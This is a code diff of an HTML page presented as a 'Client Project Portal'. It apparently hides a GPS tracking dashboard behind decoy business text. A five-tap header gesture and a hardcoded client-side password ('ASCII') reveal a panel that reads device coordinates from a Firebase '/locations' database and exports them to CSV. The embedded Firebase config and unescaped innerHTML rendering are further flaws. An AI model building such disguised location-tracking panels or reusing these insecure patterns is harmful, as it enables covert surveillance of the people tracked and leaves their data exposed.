@@ -1,98 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Client Project Portal</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
       margin: 0;
       padding: 0;
-      background: #f4f4f9;
-      color: #333;
+      background: #f4f4f4;
     }
-    .container {
-      max-width: 900px;
-      margin: auto;
-      padding: 20px;
+    header {
+      background: #002b45;
+      color: #fff;
+      padding: 1rem;
+      text-align: center;
     }
     .section {
-      background: white;
-      margin: 20px 0;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 1.5rem;
+      background: #fff;
+      margin: 1rem;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
     }
-    .section h2 {
-      margin-top: 0;
-      font-size: 1.3em;
-    }
-    #adminPanel {
-      display: none;
-    }
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      margin-bottom: 20px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background: #333;
+    .admin-btn, .enter-btn {
+      background: #002b45;
       color: white;
+      padding: 0.5rem 1rem;
       border: none;
-      padding: 10px 20px;
       border-radius: 5px;
       cursor: pointer;
+      margin-top: 10px;
+    }
+    .hidden {
+      display: none;
     }
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 10px;
+      margin-top: 1rem;
     }
     th, td {
-      padding: 10px;
       border: 1px solid #ccc;
-      text-align: left;
-      font-size: 0.95em;
+      padding: 0.5rem;
+      text-align: center;
     }
     th {
-      background: #eee;
+      background: #002b45;
+      color: white;
     }
-    #toggleAdminBtn {
-      margin-top: 40px;
-      display: block;
-      background: #222;
+    .highlight {
+      background: #dff0d8;
     }
-    #logCount {
-      margin: 10px 0;
+    .warning {
+      background: #fcf8e3;
+    }
+    .danger {
+      background: #f2dede;
+    }
+    .footer {
+      font-size: 0.8rem;
+      text-align: center;
+      padding: 1rem;
+      color: gray;
     }
   </style>
 </head>
 <body>
-
-<div class="container">
-  <div class="section" id="publicPage">
+  <header onclick="tapCounter()">
     <h2>Client Project Portal</h2>
-    <p><strong>Client Requirements</strong><br/>All specifications must be approved and timestamped.</p>
-    <p><strong>Terms and Review</strong><br/>Final review will be automatically saved and verified upon access.</p>
-    <p><strong>Legal & Compliance</strong><br/>Ensure full adherence to documentation agreements.</p>
-
-    <hr />
-    <p><strong>Admin Dashboard</strong></p>
-    <p>Enter password to access admin panel:</p>
-    <input type="password" id="adminPassword" placeholder="Enter password (e.g. ASCII)" />
-    <button onclick="showAdmin()">Enter</button>
+  </header>  <div class="section">
+    <h3>Client Requirements</h3>
+    <p>All specifications must be approved and timestamped.</p>
   </div>
-
-  <div class="section" id="adminPanel">
-    <h2>Admin Dashboard</h2>
-    <p><input type="text" id="searchInput" placeholder="Search by device or location..." style="width:100%; padding:10px;"/></p>
+  <div class="section">
+    <h3>Terms and Review</h3>
+    <p>Final review will be automatically saved and verified upon access.</p>
+  </div>
+  <div class="section">
+    <h3>Legal & Compliance</h3>
+    <p>Ensure full adherence to documentation agreements.</p>
+  </div>  <p class="footer">Tap 5 times anywhere on the header to unlock internal panel</p>  <div id="passwordSection" class="section hidden">
+    <h3>Enter password to access admin panel:</h3>
+    <input type="password" id="adminPassword" placeholder="Enter password" />
+    <button class="enter-btn" onclick="validatePassword()">Enter</button>
+  </div>  <div id="adminPanel" class="section hidden">
+    <h3>Admin Dashboard</h3>
+    <input type="text" id="searchInput" placeholder="Search by device or location..." />
     <button onclick="exportCSV()">Export as CSV</button>
-    <p id="logCount">Daily logs: 0</p>
-    <table id="logTable">
+    <p><strong>Daily logs:</strong> <span id="logCount">0</span></p>
+    <table>
       <thead>
         <tr>
           <th>Device</th>
@@ -101,100 +100,77 @@
           <th>Timestamp</th>
         </tr>
       </thead>
-      <tbody>
+      <tbody id="logTable">
         <tr><td colspan="4">Loading...</td></tr>
       </tbody>
     </table>
-  </div>
-</div>
+  </div>  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+      authDomain: "gps-d0bab.firebaseapp.com",
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+      projectId: "gps-d0bab",
+      storageBucket: "gps-d0bab.appspot.com",
+      messagingSenderId: "810816177909",
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database().ref("/locations");
 
-<!-- Firebase Scripts -->
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-<script>
-  // Firebase config
-  const firebaseConfig = {
-    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-    authDomain: "gps-d0bab.firebaseapp.com",
-    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-    projectId: "gps-d0bab",
-    storageBucket: "gps-d0bab.appspot.com",
-    messagingSenderId: "810816177909",
-    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
-
-  const tableBody = document.querySelector("#logTable tbody");
-  const logCount = document.getElementById("logCount");
-  const searchInput = document.getElementById("searchInput");
-
-  // Fetch and display data
-  function loadData() {
-    db.ref("/").on("value", snapshot => {
-      const data = snapshot.val();
-      let rows = "";
-      let count = 0;
-      for (let key in data) {
-        const entry = data[key];
-        if (entry.device && entry.latitude && entry.longitude && entry.timestamp) {
-          const time = new Date(entry.timestamp).toLocaleString();
-          const match = searchInput.value.trim().toLowerCase();
-          if (
-            !match || 
-            (entry.device && entry.device.toLowerCase().includes(match)) || 
-            (entry.latitude && entry.latitude.toString().includes(match)) || 
-            (entry.longitude && entry.longitude.toString().includes(match))
-          ) {
-            rows += `
-              <tr>
-                <td>${entry.device}</td>
-                <td>${entry.latitude}</td>
-                <td>${entry.longitude}</td>
-                <td>${time}</td>
-              </tr>
-            `;
-            count++;
-          }
-        }
+    let tapCount = 0;
+    function tapCounter() {
+      tapCount++;
+      if (tapCount >= 5) {
+        document.getElementById('passwordSection').classList.remove('hidden');
       }
-      tableBody.innerHTML = rows || "<tr><td colspan='4'>No logs found</td></tr>";
-      logCount.textContent = `Daily logs: ${count}`;
-    });
-  }
-
-  // Admin panel unlock
-  function showAdmin() {
-    const input = document.getElementById("adminPassword").value.trim();
-    if (input.toLowerCase() === "ascii") {
-      document.getElementById("publicPage").style.display = "none";
-      document.getElementById("adminPanel").style.display = "block";
-      loadData();
-      searchInput.addEventListener("input", loadData);
-    } else {
-      alert("Incorrect password!");
     }
-  }
 
-  // Export CSV
-  function exportCSV() {
-    let csv = "Device,Latitude,Longitude,Timestamp\n";
-    const rows = document.querySelectorAll("#logTable tbody tr");
-    rows.forEach(row => {
-      const cols = row.querySelectorAll("td");
-      if (cols.length === 4) {
-        csv += `${cols[0].innerText},${cols[1].innerText},${cols[2].innerText},${cols[3].innerText}\n`;
+    function validatePassword() {
+      const pass = document.getElementById("adminPassword").value;
+      if (pass === "ASCII") {
+        document.getElementById("passwordSection").classList.add("hidden");
+        document.getElementById("adminPanel").classList.remove("hidden");
+        loadLogs();
+      } else {
+        alert("Incorrect password");
       }
-    });
-    const blob = new Blob([csv], { type: "text/csv" });
-    const url = window.URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "gps_logs.csv";
-    a.click();
-    window.URL.revokeObjectURL(url);
-  }
-</script>
+    }
 
-</body>
-  </html>
+    function loadLogs() {
+      const table = document.getElementById("logTable");
+      db.on("value", (snapshot) => {
+        const data = snapshot.val();
+        table.innerHTML = "";
+        let count = 0;
+        for (let key in data) {
+          const item = data[key];
+          const row = `<tr class="${item.device === 'admin' ? 'highlight' : item.lat === undefined ? 'danger' : 'warning'}">
+            <td>${item.device || "Unknown"}</td>
+            <td>${item.lat || "N/A"}</td>
+            <td>${item.lon || "N/A"}</td>
+            <td>${new Date(item.timestamp).toLocaleString() || "N/A"}</td>
+          </tr>`;
+          table.innerHTML += row;
+          count++;
+        }
+        document.getElementById("logCount").textContent = count;
+      });
+    }
+
+    function exportCSV() {
+      let csv = "Device,Latitude,Longitude,Timestamp\n";
+      const rows = document.querySelectorAll("#logTable tr");
+      rows.forEach((row) => {
+        const cols = row.querySelectorAll("td");
+        if (cols.length === 4) {
+          csv += `${cols[0].innerText},${cols[1].innerText},${cols[2].innerText},${cols[3].innerText}\n`;
+        }
+      });
+      const blob = new Blob([csv], { type: "text/csv" });
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = "gps_logs.csv";
+      link.click();
+    }
+  </script></body>
+</html>
